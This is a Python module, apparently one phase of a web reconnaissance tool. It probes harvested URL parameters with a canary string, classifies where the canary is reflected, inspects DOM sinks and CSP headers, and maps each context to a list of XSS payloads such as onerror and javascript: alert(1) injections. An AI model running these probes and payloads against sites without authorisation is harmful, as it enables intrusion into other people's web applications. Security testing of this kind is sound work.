import re, requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.context import Context

CANARY = "JSXr4y7731z"

PAYLOAD_CLASSES = {
    "js_exec":     ["alert(1)//", ";alert(1)//", "\nalert(1)//", "};alert(1)//"],
    "js_string":   ["'-alert(1)-'", '"-alert(1)-"', "`; alert(1)//"],
    "html_body":   ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
                    "<details open ontoggle=alert(1)>", "<script>alert(1)</script>"],
    "html_attr":   ['" onmouseover=alert(1) x="', "' onmouseover=alert(1) x='",
                    '" autofocus onfocus=alert(1) "'],
    "json":        ['":<img src=x onerror=alert(1)>"', '",\"x\":\"<svg onload=alert(1)>'],
    "url_context": ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
    "css_context": ["};alert(1)//", "expression(alert(1))"],
    "unknown":     ["<img src=x onerror=alert(1)>", '" onmouseover=alert(1) "'],
}

DOM_SINKS = [
    r'(?:innerHTML|outerHTML|document\.write|insertAdjacentHTML)\s*[=+]',
    r'\.html\s*\(',
    r'\.append\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\([^,)]*JSXr4y7731z',
    r'setInterval\s*\([^,)]*JSXr4y7731z',
    r'(?:src|href|action)\s*=\s*["\']?JSXr4y7731z',
]

HIGH_VALUE = {
    "q","query","search","keyword","text","input","msg","message","content",
    "comment","description","title","subject","body","note","redirect",
    "redirect_uri","redirect_url","return","returnUrl","next","continue",
    "callback","url","goto","dest","destination","target","ref","referer",
    "referrer","back","forward","location","template","view","page","layout",
    "format","theme","style","debug","test","preview","mode","dev","name",
    "username","user","email","token","error","info","notice","alert","warn",
}


def detect_context(html, canary):
    if canary not in html:
        return None
    idx = html.find(canary)
    sur = html[max(0, idx - 300): idx + 300]
    ec  = re.escape(canary)
    if re.search(r"(?:eval|setTimeout|setInterval|Function)\s*\([^)]*" + ec, sur):
        return "js_exec"
    if re.search(r"<script[^>]*>[^<]*" + ec, sur, re.DOTALL):
        return "js_string" if re.search(r'["\']' + ec, sur) else "js_exec"
    # FIX: use a proper character class instead of broken inline quotes
    if re.search(r'(?:href|src|action|data-[a-z]+|on[a-z]+|value)\s*=\s*["\'][^"\']*' + ec, sur):
        return "html_attr"
    if re.search(r'=\s*["\'][^"\']*' + ec + r'[^"\']*["\']', sur):
        return "html_attr"
    if re.search(r'(?:href|src|action)=["\']?' + ec, sur):
        return "url_context"
    if re.search(r"<style[^>]*>[^<]*" + ec, sur, re.DOTALL):
        return "css_context"
    if re.search(r'["\']' + ec + r'["\']', sur) and html.strip().startswith(("{","[")):
        return "json"
    if re.search(r">[^<]*" + ec + r"[^<]*<", sur):
        return "html_body"
    return "unknown"


def detect_dom_sinks(html, canary):
    if canary not in html:
        return []
    idx  = html.find(canary)
    zone = html[max(0, idx - 500): idx + 500]
    return [s for s in DOM_SINKS if re.search(s, zone, re.IGNORECASE)]


def parse_csp(h):
    return {
        "raw": h, "missing": h == "",
        "unsafe_inline":  "unsafe-inline"  in h,
        "unsafe_eval":    "unsafe-eval"    in h,
        "wildcard":       bool(re.search(r"\*\.?[a-zA-Z]", h)),
        "data_uri":       "data:"          in h,
        "nonce":          "nonce-"         in h,
        "strict_dynamic": "strict-dynamic" in h,
        "report_only":    False,
    }


# ── FIX 1: clean URL builder — zero chance of double-? ───────────────────────
def _build_probe_url(url, param, value):
    parsed = urlparse(url.rstrip("?&"))
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


# ── FIX 2: explicit error handling — nothing silently disappears ──────────────
def probe_param(url, param, timeout, ua):
    probe_url = _build_probe_url(url, param, CANARY)
    result = {
        "url": url, "probe_url": probe_url, "param": param,
        "reflects": False, "context": None, "dom_sinks": [],
        "csp": "", "csp_missing": False, "csp_unsafe_inline": False,
        "csp_unsafe_eval": False, "csp_wildcard": False, "csp_nonce": False,
        "payloads": [], "status": None, "error": None, "source": "url_pool",
        "high_value_param": param.lower() in HIGH_VALUE,
    }
    try:
        r = requests.get(
            probe_url, timeout=timeout,
            headers={"User-Agent": ua, "Accept": "text/html,*/*;q=0.8"},
            allow_redirects=True,
        )
        result["status"] = r.status_code
        csp_hdr    = r.headers.get("Content-Security-Policy", "")
        csp_ro     = r.headers.get("Content-Security-Policy-Report-Only", "")
        active_csp = csp_hdr or csp_ro
        csp_info   = parse_csp(active_csp)
        if csp_ro and not csp_hdr:
            csp_info["report_only"] = True
        result.update({
            "csp": active_csp,
            "csp_missing":       csp_info["missing"],
            "csp_unsafe_inline": csp_info["unsafe_inline"],
            "csp_unsafe_eval":   csp_info["unsafe_eval"],
            "csp_wildcard":      csp_info["wildcard"],
            "csp_nonce":         csp_info["nonce"],
            "csp_info":          csp_info,
        })
        if r.status_code == 200 and CANARY in r.text:
            result["reflects"]  = True
            ctx_type            = detect_context(r.text, CANARY)
            result["context"]   = ctx_type
            result["dom_sinks"] = detect_dom_sinks(r.text, CANARY)
            result["payloads"]  = PAYLOAD_CLASSES.get(ctx_type, PAYLOAD_CLASSES["unknown"])
    except requests.exceptions.Timeout:
        result["error"] = "timeout"
        result["status"] = "timeout"
    except requests.exceptions.ConnectionError as exc:
        result["error"] = f"connection_error: {str(exc)[:120]}"
        result["status"] = "error"
    except Exception as exc:                         # FIX 2: never swallowed
        result["error"] = f"unexpected: {str(exc)[:120]}"
        result["status"] = "error"
    return result


def build_probe_list(ctx):
    probes, seen = [], set()
    base_url = getattr(ctx, "canonical_url", None) or ctx.target_url

    def add(url, param, source="url_pool"):
        clean = url.rstrip("?&")
        k = f"{clean}|{param}"
        if k not in seen:
            seen.add(k)
            probes.append((clean, param, source))

    # 1. URL pool — params already in harvested URLs
    for url in ctx.url_pool:
        if "?" in url:
            for param in parse_qs(urlparse(url).query).keys():
                add(url, param, "url_pool")

    # 2. Pre-uro params harvested BEFORE uro dedup in urls.py (FIX 4)
    root = base_url.rstrip("/")
    for param in getattr(ctx, "pre_uro_params", []):
        add(_build_probe_url(root, param, "x"), param, "pre_uro")

    # 3. Robots live — FIX 5: ALL 200 HTML pages, not just keyword matches
    for entry in ctx.robots_live:
        if entry.get("status") == 200 and "html" in entry.get("content_type", "").lower():
            url = entry.get("resolved_url") or entry["url"]
            for param in parse_qs(urlparse(url).query).keys():
                add(url, param, "robots")
            for param in ctx.js_global_params:
                add(_build_probe_url(url, param, "x"), param, "robots+js")

    # 4. JS-derived endpoints
    for endpoint, params in ctx.js_param_map.items():
        full = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
        for param in params:
            add(_build_probe_url(full, param, "x"), param, "js_map")

    # 5. Hidden params (arjun / x8)
    for endpoint, params in ctx.hidden_params.items():
        full = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
        for param in params:
            add(_build_probe_url(full, param, "x"), param, "x8")

    return probes


def run(ctx, phase_num=7, total=9):
    probes = build_probe_list(ctx)
    ctx.log(f"[probe] {len(probes)} (url, param) pairs to test")

    if not probes:
        ctx.phases_run.append("probe")
        ctx.log_phase_done(phase_num, total, "probe",
                           "0 probe pairs — check urls/js_extract phases")
        return ctx

    cap = 600
    if len(probes) > cap:
        order = {"js_map": 0, "robots+js": 1, "x8": 2, "pre_uro": 3,
                 "robots": 4, "url_pool": 5}
        probes.sort(key=lambda x: (
            order.get(x[2], 6),
            0 if x[1].lower() in HIGH_VALUE else 1,
        ))
        probes = probes[:cap]
        ctx.log(f"[probe] Capped to {cap} pairs (highest-priority first)")

    results, reflected, dom_hit, errors = [], 0, 0, 0
    workers = min(40, len(probes))          # FIX 3: raised from 10 → 40

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(probe_param, u, p, ctx.timeout, ctx.user_agent): (u, p, s)
            for u, p, s in probes
        }
        done = 0
        for fut in as_completed(futures):
            r = fut.result()
            u, p, s = futures[fut]
            r["source"] = s
            results.append(r)
            done += 1
            if r["reflects"]:
                reflected += 1
                dom_flag = " [DOM-SINK]" if r.get("dom_sinks") else ""
                csp_lbl  = ("no-csp"        if r["csp_missing"]       else
                            "unsafe-inline" if r["csp_unsafe_inline"] else "has-csp")
                ctx.log(
                    f"[probe] REFLECTS  {p:<22} @ {r['url'][:52]}"
                    f"  [{r['context']}] [{csp_lbl}]{dom_flag}"
                )
                if r.get("dom_sinks"):
                    dom_hit += 1
            elif r.get("error"):             # FIX 2: always visible
                errors += 1
                if not ctx.silent:
                    ctx.log(f"[probe]   ERROR  {p:<20}  {r['error'][:60]}  {u[:48]}")
            elif done % 50 == 0:
                ctx.log(f"[probe] {done}/{len(probes)} probed...")

    ctx.reflections = results
    ctx.write_json("reflections_raw.json", results)
    ctx.phases_run.append("probe")
    ctx.log_phase_done(
        phase_num, total, "probe",
        f"{reflected} reflections | {dom_hit} DOM-sink hits | "
        f"{len(probes)} tested | {errors} errors | workers={workers}",
    )
    return ctx
